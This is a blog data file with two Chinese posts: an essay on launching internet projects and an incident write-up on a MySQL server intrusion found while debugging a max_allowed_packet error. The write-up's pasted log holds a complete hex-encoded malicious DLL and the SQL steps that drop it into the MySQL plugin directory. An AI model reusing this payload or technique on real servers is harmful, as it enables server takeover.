获取数据入手。如果你要想快速盈利，你就不应该选择互联网项目，你应该去做IT项目外包。\n\n所以你确定你真需要做互联网项目吗？你真的合适做互联网项目吗？\n\n","source":"_posts/idea-1.md","raw":"---\ntitle: 你确定真的要做互联网项目吗\ndate: 2016-7-1\ndesc: 互联网 团队\n---\n最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:\n1. 老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或去融资做大。\n2. 然后招来一个认为技术比较牛B的开发和几个程序员\n3. 公司和老板急不可待的要快点上线\n4. 大牛说就你这么一个复杂玩意，我怎么在这么短的时间完成了。\n5. 大家决定买套系统或者外包吧-,老板无耐的想想，我又没有更多钱和时间去折腾，找个皮包公司或者买套系统算了。\n6. 折腾一个月终于成了,急不可待上线。\n7. 销售说这玩意请问能符合我们哪点需求?客户那边也不同意。\n8. 然后开始改需求，码农开始填坑\n9. 填坑不断，问题不断，大家开始撕逼， 老板说这么几个模板和功能，你们都改不好？技术团队说你们需求确定了吗?然后产品经理出现，然后长期拉踞战公司内部开始,一直撕逼中..........公司陷入一个互坑的节奏，关门已经不远。\n但最终坑都是程序员挖的，正如下图描述一下:\n\n![图](http://binyanbin.github.io/img/other-1.png)\n\n所以锅也肯定也是程序员背。\n\n通常有这么一种情况也许成功过，一大堆数据需要录入系统，或者几个G的数据需要换个平台，这是老板以前业务的系统的数据，现在需要找一个更合适自己的系统平台，并准备把它互联网化，然后，找来一帮人，去开发实现这个系统，刚开地这帮人也想找现有系统，但就是他玛的没有合适系统，只好硬着头皮去搞，大家坚持了几年，最后还真他玛的搞成了.\n一开始就天马行空的设计产品，然后再根据产品去做数据，搞销售，搞运营，这种方式往往失率高。\n就像很多公司搞o2o,电商，一开始就纠结商业模式，系统，平台，功能。你用户都没有，这些东西都没什么卵用。\n有人一个qq空间做产品展示，用qq加几百个传统渠道商，qq订货，线下打款，最多开一个淘宝店。业务做得飞起来，一天忙不停。\n也有人在家或公司附近做主动加周围人的微信做产品宣传，用微信朋友圈做产品展示，微信订货，自己送货，线下付款或微信付款都可以，同样也是忙个不停。\n电商和o2o有很多简单玩法，不一定需要一个什么网站或app出来去支持它，用最原始的方式就能完成交易，如果你想做网站或app，你的目的应该是要收集数据，收集数据就没必要纠结于细节，只要能帮你收集数，这个东西就是有价值的。\n\n如果要做互联网项目，那就需要做数量级，没有数量级算什么互联网项目。最开始的考虑就应该从获取数据入手。如果你要想快速盈利，你就不应该选择互联网项目，你应该去做IT项目外包。\n\n所以你确定你真需要做互联网项目吗？你真的合适做互联网项目吗？\n\n","slug":"idea-1","published":1,"updated":"2016-07-04T13:59:05.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llt5000hg2x6f8nz1lk3","content":"<p>最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:</p>\n<ol>\n<li>老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或去融资做大。</li>\n<li>然后招来一个认为技术比较牛B的开发和几个程序员</li>\n<li>公司和老板急不可待的要快点上线</li>\n<li>大牛说就你这么一个复杂玩意，我怎么在这么短的时间完成了。</li>\n<li>大家决定买套系统或者外包吧-,老板无耐的想想，我又没有更多钱和时间去折腾，找个皮包公司或者买套系统算了。</li>\n<li>折腾一个月终于成了,急不可待上线。</li>\n<li>销售说这玩意请问能符合我们哪点需求?客户那边也不同意。</li>\n<li>然后开始改需求，码农开始填坑</li>\n<li>填坑不断，问题不断，大家开始撕逼， 老板说这么几个模板和功能，你们都改不好？技术团队说你们需求确定了吗?然后产品经理出现，然后长期拉踞战公司内部开始,一直撕逼中……….公司陷入一个互坑的节奏，关门已经不远。<br>但最终坑都是程序员挖的，正如下图描述一下:</li>\n</ol>\n<p><img src=\"http://binyanbin.github.io/img/other-1.png\" alt=\"图\"></p>\n<p>所以锅也肯定也是程序员背。</p>\n<p>通常有这么一种情况也许成功过，一大堆数据需要录入系统，或者几个G的数据需要换个平台，这是老板以前业务的系统的数据，现在需要找一个更合适自己的系统平台，并准备把它互联网化，然后，找来一帮人，去开发实现这个系统，刚开地这帮人也想找现有系统，但就是他玛的没有合适系统，只好硬着头皮去搞，大家坚持了几年，最后还真他玛的搞成了.<br>一开始就天马行空的设计产品，然后再根据产品去做数据，搞销售，搞运营，这种方式往往失率高。<br>就像很多公司搞o2o,电商，一开始就纠结商业模式，系统，平台，功能。你用户都没有，这些东西都没什么卵用。<br>有人一个qq空间做产品展示，用qq加几百个传统渠道商，qq订货，线下打款，最多开一个淘宝店。业务做得飞起来，一天忙不停。<br>也有人在家或公司附近做主动加周围人的微信做产品宣传，用微信朋友圈做产品展示，微信订货，自己送货，线下付款或微信付款都可以，同样也是忙个不停。<br>电商和o2o有很多简单玩法，不一定需要一个什么网站或app出来去支持它，用最原始的方式就能完成交易，如果你想做网站或app，你的目的应该是要收集数据，收集数据就没必要纠结于细节，只要能帮你收集数，这个东西就是有价值的。</p>\n<p>如果要做互联网项目，那就需要做数量级，没有数量级算什么互联网项目。最开始的考虑就应该从获取数据入手。如果你要想快速盈利，你就不应该选择互联网项目，你应该去做IT项目外包。</p>\n<p>所以你确定你真需要做互联网项目吗？你真的合适做互联网项目吗？</p>\n","excerpt":"","more":"<p>最近又有人在群里高价求人(技术合伙人)，待遇2-3W，可以给股份，要求一个月把基本功能全部弄出来。我就开始遐想他们的开搞的过程都是:</p>\n<ol>\n<li>老板或公司有自己觉得很好的idea和一点点钱，并且有一点相关的业务资源，想做一个互联网项目，快速出原型去吸引客户或去融资做大。</li>\n<li>然后招来一个认为技术比较牛B的开发和几个程序员</li>\n<li>公司和老板急不可待的要快点上线</li>\n<li>大牛说就你这么一个复杂玩意，我怎么在这么短的时间完成了。</li>\n<li>大家决定买套系统或者外包吧-,老板无耐的想想，我又没有更多钱和时间去折腾，找个皮包公司或者买套系统算了。</li>\n<li>折腾一个月终于成了,急不可待上线。</li>\n<li>销售说这玩意请问能符合我们哪点需求?客户那边也不同意。</li>\n<li>然后开始改需求，码农开始填坑</li>\n<li>填坑不断，问题不断，大家开始撕逼， 老板说这么几个模板和功能，你们都改不好？技术团队说你们需求确定了吗?然后产品经理出现，然后长期拉踞战公司内部开始,一直撕逼中……….公司陷入一个互坑的节奏，关门已经不远。<br>但最终坑都是程序员挖的，正如下图描述一下:</li>\n</ol>\n<p><img src=\"http://binyanbin.github.io/img/other-1.png\" alt=\"图\"></p>\n<p>所以锅也肯定也是程序员背。</p>\n<p>通常有这么一种情况也许成功过，一大堆数据需要录入系统，或者几个G的数据需要换个平台，这是老板以前业务的系统的数据，现在需要找一个更合适自己的系统平台，并准备把它互联网化，然后，找来一帮人，去开发实现这个系统，刚开地这帮人也想找现有系统，但就是他玛的没有合适系统，只好硬着头皮去搞，大家坚持了几年，最后还真他玛的搞成了.<br>一开始就天马行空的设计产品，然后再根据产品去做数据，搞销售，搞运营，这种方式往往失率高。<br>就像很多公司搞o2o,电商，一开始就纠结商业模式，系统，平台，功能。你用户都没有，这些东西都没什么卵用。<br>有人一个qq空间做产品展示，用qq加几百个传统渠道商，qq订货，线下打款，最多开一个淘宝店。业务做得飞起来，一天忙不停。<br>也有人在家或公司附近做主动加周围人的微信做产品宣传，用微信朋友圈做产品展示，微信订货，自己送货，线下付款或微信付款都可以，同样也是忙个不停。<br>电商和o2o有很多简单玩法，不一定需要一个什么网站或app出来去支持它，用最原始的方式就能完成交易，如果你想做网站或app，你的目的应该是要收集数据，收集数据就没必要纠结于细节，只要能帮你收集数，这个东西就是有价值的。</p>\n<p>如果要做互联网项目，那就需要做数量级，没有数量级算什么互联网项目。最开始的考虑就应该从获取数据入手。如果你要想快速盈利，你就不应该选择互联网项目，你应该去做IT项目外包。</p>\n<p>所以你确定你真需要做互联网项目吗？你真的合适做互联网项目吗？</p>\n"},{"title":"mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题","date":"2016-06-22T16:00:00.000Z","desc":"mysql入侵 max_allowed_packet","_content":"## 情况\n\n最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢复正常。\n查找错误日志,以下为错误堆栈信息:\n```CSharp\nMySql.Data.MySqlClient.MySqlException (0x80004005): Packets larger than max_allowed_packet are not allowed.\n在 MySql.Data.MySqlClient.MySqlStream.SendPacket(MySqlPacket packet)\n在 MySql.Data.MySqlClient.NativeDriver.ExecutePacket(MySqlPacket packetToExecute)\n在 MySql.Data.MySqlClient.NativeDriver.SendQuery(MySqlPacket queryPacket)\n在 MySql.Data.MySqlClient.Driver.SendQuery(MySqlPacket p)\n在 MySql.Data.MySqlClient.Statement.ExecuteNext()\n在 MySql.Data.MySqlClient.MySqlCommand.ExecuteReader(CommandBehavior behavior)\n在 MySql.Data.Entity.EFMySqlCommand.ExecuteDbDataReader(CommandBehavior behavior)\n在 System.Data.Entity.Infrastructure.Interception.InternalDispatcher`1.Dispatch[TTarget,TInterceptionContext,TResult](TTarget target, Func`3 operation, TInterceptionContext interceptionContext, Action`3 executing, Action`3 executed)\n在 System.Data.Entity.Infrastructure.Interception.DbCommandDispatcher.Reader(DbCommand command, DbCommandInterceptionContext interceptionContext)\n在 System.Data.Entity.Core.EntityClient.Internal.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior)\n```\n问题原因是:Packets larger than max_allowed_packet are not allowed.\n查看官网解释:\nWhen a MySQL client or the mysqld server receives a packet bigger than max_allowed_packet bytes, it issues an ER_NET_PACKET_TOO_LARGE error and closes the connection. With some clients, you may also get a Lost connection to MySQL server during query error if the communication packet is too large.\nBoth the client and the server have their own max_allowed_packet variable, so if you want to handle big packets, you must increase this variable both in the client and in the server.\n按官文文档的解释是你的sql命令太长。\n\n## 排查问题\n\n随即把mysql max_allowed_packet调到20M仍无法解决，网站依就无法访问数据库，仍然出现相同的错误。苦思无果之后，只有从.net mysqlclient源码查起。\n出错源码为MysqlSteam.cs\n\n```CSharp\npublic void SendPacket(MySqlPacket packet)\n{\n    byte[] buffer = packet.Buffer;\n    int length = packet.Position - 4;\n\n    if ((ulong)length > maxPacketSize)\n        throw new MySqlException(Resources.QueryTooLarge (int)MySqlErrorCode.PacketTooLarge);\n\n    int offset = 0;\n    while (length > 0)\n    {\n        int lenToSend = length > maxBlockSize ? maxBlockSize : length;\n        buffer[offset] = (byte)(lenToSend & 0xff);\n        buffer[offset + 1] = (byte)((lenToSend >> 8) & 0xff);\n        buffer[offset + 2] = (byte)((lenToSend >> 16) & 0xff);\n        buffer[offset + 3] = sequenceByte++;\n        \n        outStream.Write(buffer, offset, lenToSend + 4);\n        outStream.Flush();\n        length -= lenToSend;\n        offset += lenToSend;\n    }\n}\n```\n\n查找maxPacketSize的来源\nDriver.cs\n```CSharp\npublic virtual void Configure(MySqlConnection connection)\n{\n    bool firstConfigure = false;\n    \n    // if we have not already configured our server variables\n    // then do so now\n    if (serverProps == null)\n    {\n    firstConfigure = true;\n    \n\t// if we are in a pool and the user has said it's ok to cache the\n\t// properties, then grab it from the pool\n    try\n    {\n        if (Pool != null && Settings.CacheServerProperties)\n        {\n        if (Pool.ServerProperties == null)\n          Pool.ServerProperties = LoadServerProperties(connection);\n            serverProps = Pool.ServerProperties;\n        }\n        else\n            serverProps = LoadServerProperties(connection);\n        \n        LoadCharacterSets(connection);\n    }\n    catch (MySqlException ex)\n    {\n        // expired password capability\n        if (ex.Number == 1820)\n        {\n            IsPasswordExpired = true;\n            return;\n        }\n        throw;\n    }\n  \n\t.......\n\tif (serverProps.ContainsKey(\"max_allowed_packet\"))\n\t    maxPacketSize = Convert.ToInt64(serverProps[\"max_allowed_packet\"]);\n\t.......\n\t}\n}\n```\n\n继续查找LoadServerProperties，仍在Driver.cs中\n\n```CSharp\nprivate Dictionary<string,string> LoadServerProperties(MySqlConnection connection)\n{\n    // load server properties\n    Dictionary<string, string> hash = new Dictionary<string, string>();\n    MySqlCommand cmd = new MySqlCommand(\"SHOW VARIABLES\", connection);\n    try\n    {\n        using (MySqlDataReader reader = cmd.ExecuteReader())\n        {\n            while (reader.Read())\n            {\n                string key = reader.GetString(0);\n                string value = reader.GetString(1);\n                hash[key] = value;\n            }\n        }\n        // Get time zone offset as numerical value\n        timeZoneOffset = GetTimeZoneOffset(connection);\n        return hash;\n    }\n    catch (Exception ex)\n    {\n        MySqlTrace.LogError(ThreadID, ex.Message);\n        throw;\n    }\n}\n```\n\n客户端的max_allowed_packet也是从服务器获取下来的.\n所以就没办法解释这个问题，查找mysql错误日志，没有任何错误信息。最后只好把mysql普通日志打开。\nset global general_log = on\n\n当天傍晚服务器依就挂掉，整个网站的所有页面无法访问数据库.sql日志100多m，非常不便于查看，用nodejs写了一个查找最长sql语句的方法.\n\n\n\n``` node\nvar fs = require('fs');\nvar str = \"\";\nfs.readFile('mysql.log', 'utf8', function (err, data) {\n    if (err) throw err;\n    str = data;\n    searchkey = 'Query SELECT';\n    var pos = str.indexOf(searchkey);\n    var arr=new Array();\n    arr[0] = pos;\n    var k = 1;\n    var count = 0;\n    while (pos !== -1) {\n        count++;\n        pos = str.indexOf(searchkey, pos + 1);\n        arr[k] = pos;\n        k++;\n    }\n    var max =0;\n    var maxindex = 0;\n    for (var i=0;i<arr.length-2;i++)\n    {\n        var temp = arr[i+1] -arr[i];\n        if (temp>max)\n        {\n            max = temp;\n            maxindex =i;\n        }\n    }\n    console.log(max);\n    var txt = \"max:\"+max+\"\\n\\r\";\n    txt= txt + str.substr(arr[maxindex],max)\n    fs.writeFile('result.txt', txt, function (err) {\n        if (err) throw err;\n        console.log('It\\'s saved!'); \n    });\n});\n```\n\n执行程序查询日志之后发现我们的mysql已被人入侵\n```sql\n160623 18:35:05\t84 Connect\troot@114.55.39.75 on mysql\n84 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:08\t85 Connect\troot@114.55.39.75 on mysql\n85 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:11\t86 Connect\troot@114.55.39.75 on mysql\n86 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:15\t87 Connect\troot@114.55.39.75 on mysql\n87 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:17\t88 Connect\troot@114.55.39.75 on mysql\n88 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:18\t89 Connect\troot@114.55.39.75 on mysql\n89 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:21\t90 Connect\troot@114.55.39.75 on mysql\n90 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:23\t91 Connect\troot@114.55.39.75 on mysql\n91 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:26\t92 Connect\troot@114.55.39.75 on mysql\n92 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)\n160623 18:35:34\t93 Connect\troot@114.55.39.75 on mysql\n160623 18:35:35\t93 Query\tset autocommit=0\n160623 18:35:36\t93 Quit\t\n160623 18:35:37\t94 Connect\troot@114.55.39.75 on mysql\n94 Query\tset autocommit=0\n94 Query\tSELECT VERSION()\n160623 18:35:38\t94 Query\tset @a = concat('',0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000EF55A8C1AB34C692AB34C692AB34C692C42BCC92AF34C692C42BC292A934C692AB34C692A834C692AB34C792B834C692C92BD592AC34C6929D12CD92A934C6925414C292AA34C69252696368AB34C692000000000000000000000000000000000000000000000000504500004C0103000E6DFF4F0000000000000000E0000E210B01060000100000001000000050000020660000006000000070000000000010001000000002000004000000000000000400000000000000008000000010000000000000020000000000100000100000000010000010000000000000100000006C71000070000000007000006C010000000000000000000000000000000000000000000000000000DC7100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000E0555058310000000000100000006000000008000000040000000000000000000000000000400000E05550583200000000001000000070000000020000000C0000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303400555058210D0902081292E561117752FFF14200001406000000500000260100C02F775FFE8B4C2408B801003BC8750A0C04890D21D8C2FCF676EC0C0090008B4412C7400813100432C0C3EE6FDFBE81EC34020C5355568D1810575033F6682E6E77FBDD906813808974241CC71528044DFF15315DB7BDFD0085C075208D531C8D542B515C183428D8EDD8EF52505633845123048B1B14520ADC5DFBEE08B9660033C08D7C244B20F3AB2ED375DDFF3F2850516A01565A383774073C5BB77B4D5C44B80750007FE80C03FB7BEBBA524D2835182F506A03663C568912768FFD6F2C1B4C8BAC244C0260942440398B1DFFFF7FEF74108B4D0827208B790483C9FFF2AEF7D12BF98BC18BF78BFA63DFFFFFC1E902F3A58BC883E103F3A4FFD38D8C24AC6D840694DBBB3F7303C01483BC24BC0D0275558B1BB0EEDEFD3783E804743E48740E48F6487543BF5D14EB41FF5E83E91CB4120B17150CEB2B83EFDDCFD8F802250704EB1B0620FCEB1413D6DC217F0AF0EB09E89DBA9F58B0367B6A00A107A3C1ED6B77B1A8CE8B115218F1586CEF164CF70F85D500E93513062620A8FFD6CAC9EDDD8B3D0E1C68102715FFD7886CD662C10F4AEE1406EFFFB16F840470EC3C8BF083C40885F674165614C2DBD8916C38560634190C8DBC599F139E2CAA83C177E6308BB4E11BB608802704D44889460C5154FBD8EF83C352514D40502A2C8B7E0C40750BDB162714438BAB54335F7FFCD6B84B49899F325E5D5B81C482C38B45DE2C65BB08268B386965703E4343C0691752186710422E994084080B3F256C90000F8B400C5974EB4ED8B30846405921FF25134C05B8A11B1948543108F50E39052FECBE6F59DC7E2EFF0D078B051024FE018B09CB21FD4871E0753F6880383059BEF7B7BBA314E875049EEB66832000A10DBC041FBBE1FB04001CE4E204A6FF555959EB3D6AAF8B756339269B305E21E3D8FF5FA471FC3BF072128B0E85C97407FFD11E83EE672DFD1D6CEABB83251100595E2F5885FFDF30F2C1EC538B5D08568B750C578B7D10E76DB4FFF77509833D5F00EB2683FE01740504E62287E97EF364EC09575653FFD0080C6FDDFDFBDC5E82B04E0FA3FBFFFF3389450CDF60ADAE4C17372B23F64603BBDD0ED8752634032125837D7F74115BFBD6450E083C8B025F5E5B5D9C88223B824D280000DF2E7FA877726F6E672E6F6B0328257329DBCBF6FF20706F72746E756D626572200F646F73760A7304D8FBB66925201E002728FFFFADB9002B03633A5C57696E646F77735C76332E6C6F6BBFE4BB6717612B62004374656D70040384BD6F7F3230395C6D61142E657865371F9574FFFE6973657475701A202D6F223D77DAB7EDDB221A70616263057963556E6B6E1E6CF7DEDE07546F6F2F6C64218F50585007EE6F83FC32303033302368652D6E65770BF7BF05B2387737410064006D0069006E03AFB9AE7D7300740072C9056F070D006EEC7FB2611F6C0076003100320033177013A4E1CC6D2365252750394EFDFF0B4159595354454D5C43757272656E74436FED60DBB60372AE53735C0A5C5425FE19B6B76D90616C201472609D5374617400B4BF1967A15244502D5463A4C8561484230CB2398A0AB01010806DF9FF0144656C65746546696C6541470A566DBBDD91BC45780E57690765630853FB9F66BB1D657034BD0052656743726561376BDF8E7D4B6579410E5175377956616C063969B6F717206C6F731F36CA24E0CDFDFF5F61646A7573745F666469760D5D697474DB6E6F0DD60A7370720C7466086D41F7EEED5A367066633D077075747306D36C9B796F70656E73654ED548B5B16FDB4EAD5524724164640B4C386B0276BF3D47726F7570114D6557732D5BFB9F66E25455524C446F776E578454FDFF63B36FEF00172F171D070B260827200839251610FFFFFFBF0A0B212007080E0E070705060F06071D24073F2207471406060E08060B0DEDFFAD6D180500060A150C0622125C1C005045416F8351FF4C0104000E6DFF4F43E00D210B019C7D7684062A0030130D14000F20969D278F10001004000717A40BD650272A02029AEDD9B207067022076E5CF2818CEA4F78DC4000008406922E40575C2E5BF67417B87874B8B0100342CFB6F121602E72642661CCDE2062876C0903A2402E26940CD2DC27F001303036D91CDBC04F652010BC27657353724042043E210000B8870AE5480412000000FF000000000000000000000000807C2408010F85B901000060BE006000108DBE00B0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9070000008A07472CE83C0177F7803F0175F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE004000008B0709C0743C8B5F048D84300060000001F35083C708FF9678600000958A074708C074DC89F95748F2AE55FF967C60000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE806000008DBE00F0FFFFBB0010000050546A045357FFD58D870702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E924ACFFFF0000000000000000000000000000000000000000000000000000000000000000000000B070000078700000000000000000000000000000BD70000090700000000000000000000000000000CA70000098700000000000000000000000000000D5700000A0700000000000000000000000000000E2700000A87000000000000000000000000000000000000000000000EC700000FA7000000A7100001A7100002871000000000000367100000000000044710000000000004A7100000000000056710000000000004B45524E454C33322E444C4C0041445641504933322E646C6C004D53564352542E646C6C004E455441504933322E646C6C0075726C6D6F6E2E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000526567436C6F73654B65790000006672656500004E657455736572416464000055524C446F776E6C6F6164546F46696C65410000000000000E6DFF4F00000000B271000001000000030000000300000094710000A0710000AC710000301000003013000020100000BC710000C2710000CF7100000000010002006D7973716C2E646C6C007870646C33007870646C335F6465696E6974007870646C335F696E6974000000006000000C0000002D360000000000000000000000000000000000000000000000000000)\n94 Query\tuse mysql\n94 Query\tdrop table IF EXISTS yongger2\n94 Query\tSHOW WARNINGS\n94 Query\tcreate table yongger2(data LONGBLOB)\n160623 18:35:39\t94 Query\tinsert into yongger2 values(\"\")\n94 Query\tupdate yongger2 set data = @a\n94 Query\tset @dir2 = concat('select data from yongger2 into DUMPFILE \"',@@plugin_dir,'\\\\cna12.dll\"')\n94 Query\tset @dir2 = replace(@dir2,'\\\\','\\\\\\\\')\n94 Query\tset @dir2 = replace(@dir2,\"/\",\"\\\\\\\\\")\n160623 18:35:40\t94 Query\tprepare sql3 from @dir2\n94 Prepare\tselect data from yongger2 into DUMPFILE \"C:\\\\Program Files (x86)\\\\MySQL\\\\MySQL Server 5.6\\\\lib\\\\plugin\\\\\\\\cna12.dll\"\n....\n....\n....\n后面1W行省略\n```\n\n后面的内容真是看不下去,种了无数dll到服务器上。整个服务器被控制。\n然后。。。。我就没有然后了。。。。。。。。。。。。\n\n## 最后\n\n遇到这种情况，好像只能重装系统了。\n特别要注意的是:0x4D5A是pe文件头，如果你的日志中出现这个，请提高警觉。\nPS:PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）\n\n\n","source":"_posts/hishop-4.md","raw":"---\ntitle: mysql出现Packets larger than max_allowed_packet are not allowed时所发现的问题\ndate: 2016-6-23\ndesc: mysql入侵 max_allowed_packet\n---\n## 情况\n\n最近公司网站出现所有页面无法访问数据库的问题，但是mysql第三方客户端又可以访问如workbench,但是重启mysql服务之后，网站又恢复正常。\n查找错误日志,以下为错误堆栈信息:\n```CSharp\nMySql.Data.MySqlClient.MySqlException (0x80004005): Packets larger than max_allowed_packet are not allowed.\n在 MySql.Data.MySqlClient.MySqlStream.SendPacket(MySqlPacket packet)\n在 MySql.Data.MySqlClient.NativeDriver.ExecutePacket(MySqlPacket packetToExecute)\n在 MySql.Data.MySqlClient.NativeDriver.SendQuery(MySqlPacket queryPacket)\n在 MySql.Data.MySqlClient.Driver.SendQuery(MySqlPacket p)\n在 MySql.Data.MySqlClient.Statement.ExecuteNext()\n在 MySql.Data.MySqlClient.MySqlCommand.ExecuteReader(CommandBehavior behavior)\n在 MySql.Data.Entity.EFMySqlCommand.ExecuteDbDataReader(CommandBehavior behavior)\n在 System.Data.Entity.Infrastructure.Interception.InternalDispatcher`1.Dispatch[TTarget,TInterceptionContext,TResult](TTarget target, Func`3 operation, TInterceptionContext interceptionContext, Action`3 executing, Action`3 executed)\n在 System.Data.Entity.Infrastructure.Interception.DbCommandDispatcher.Reader(DbCommand command, DbCommandInterceptionContext interceptionContext)\n在 System.Data.Entity.Core.EntityClient.Internal.EntityCommandDefinition.ExecuteStoreCommands(EntityCommand entityCommand, CommandBehavior behavior)\n```\n问题原因是:Packets larger than max_allowed_packet are not allowed.\n查看官网解释:\nWhen a MySQL client or the mysqld server receives a packet bigger than max_allowed_packet bytes, it issues an ER_NET_PACKET_TOO_LARGE error and closes the connection. With some clients, you may also get a Lost connection to MySQL server during query error if the communication packet is too large.\nBoth the client and the server have their own max_allowed_packet variable, so if you want to handle big packets, you must increase this variable both in the client and in the server.\n按官文文档的解释是你的sql命令太长。\n\n## 排查问题\n\n随即把mysql max_allowed_packet调到20M仍无法解决，网站依就无法访问数据库，仍然出现相同的错误。苦思无果之后，只有从.net mysqlclient源码查起。\n出错源码为MysqlSteam.cs\n\n```CSharp\npublic void SendPacket(MySqlPacket packet)\n{\n    byte[] buffer = packet.Buffer;\n    int length = packet.Position - 4;\n\n    if ((ulong)length > maxPacketSize)\n        throw new MySqlException(Resources.QueryTooLarge (int)MySqlErrorCode.PacketTooLarge);\n\n    int offset = 0;\n    while (length > 0)\n    {\n        int lenToSend = length > maxBlockSize ? maxBlockSize : length;\n        buffer[offset] = (byte)(lenToSend & 0xff);\n        buffer[offset + 1] = (byte)((lenToSend >> 8) & 0xff);\n        buffer[offset + 2] = (byte)((lenToSend >> 16) & 0xff);\n        buffer[offset + 3] = sequenceByte++;\n        \n        outStream.Write(buffer, offset, lenToSend + 4);\n        outStream.Flush();\n        length -= lenToSend;\n        offset += lenToSend;\n    }\n}\n```\n\n查找maxPacketSize的来源\nDriver.cs\n```CSharp\npublic virtual void Configure(MySqlConnection connection)\n{\n    bool firstConfigure = false;\n    \n    // if we have not already configured our server variables\n    // then do so now\n    if (serverProps == null)\n    {\n    firstConfigure = true;\n    \n\t// if we are in a pool and the user has said it's ok to cache the\n\t// properties, then grab it from the pool\n    try\n    {\n        if (Pool != null && Settings.CacheServerProperties)\n        {\n        if (Pool.ServerProperties == null)\n          Pool.ServerProperties = LoadServerProperties(connection);\n            serverProps = Pool.ServerProperties;\n        }\n        else\n            serverProps = LoadServerProperties(connection);\n        \n        LoadCharacterSets(connection);\n    }\n    catch (MySqlException ex)\n    {\n        // expired password capability\n        if (ex.Number == 1820)\n        {\n            IsPasswordExpired = true;\n            return;\n        }\n        throw;\n    }\n  \n\t.......\n\tif (serverProps.ContainsKey(\"max_allowed_packet\"))\n\t    maxPacketSize = Convert.ToInt64(serverProps[\"max_allowed_packet\"]);\n\t.......\n\t}\n}\n```\n\n继续查找LoadServerProperties，仍在Driver.cs中\n\n```CSharp\nprivate Dictionary<string,string> LoadServerProperties(MySqlConnection connection)\n{\n    // load server properties\n    Dictionary<string, string> hash = new Dictionary<string, string>();\n    MySqlCommand cmd = new MySqlCommand(\"SHOW VARIABLES\", connection);\n    try\n    {\n        using (MySqlDataReader reader = cmd.ExecuteReader())\n        {\n            while (reader.Read())\n            {\n                string key = reader.GetString(0);\n                string value = reader.GetString(1);\n                hash[key] = value;\n            }\n        }\n        // Get time zone offset as numerical value\n        timeZoneOffset = GetTimeZoneOffset(connection);\n        return hash;\n    }\n    catch (Exception ex)\n    {\n        MySqlTrace.LogError(ThreadID, ex.Message);\n        throw;\n    }\n}\n```\n\n客户端的max_allowed_packet也是从服务器获取下来的.\n所以就没办法解释这个问题，查找mysql错误日志，没有任何错误信息。最后只好把mysql普通日志打开。\nset global general_log = on\n\n当天傍晚服务器依就挂掉，整个网站的所有页面无法访问数据库.sql日志100多m，非常不便于查看，用nodejs写了一个查找最长sql语句的方法.\n\n\n\n``` node\nvar fs = require('fs');\nvar str = \"\";\nfs.readFile('mysql.log', 'utf8', function (err, data) {\n    if (err) throw err;\n    str = data;\n    searchkey = 'Query SELECT';\n    var pos = str.indexOf(searchkey);\n    var arr=new Array();\n    arr[0] = pos;\n    var k = 1;\n    var count = 0;\n    while (pos !== -1) {\n        count++;\n        pos = str.indexOf(searchkey, pos + 1);\n        arr[k] = pos;\n        k++;\n    }\n    var max =0;\n    var maxindex = 0;\n    for (var i=0;i<arr.length-2;i++)\n    {\n        var temp = arr[i+1] -arr[i];\n        if 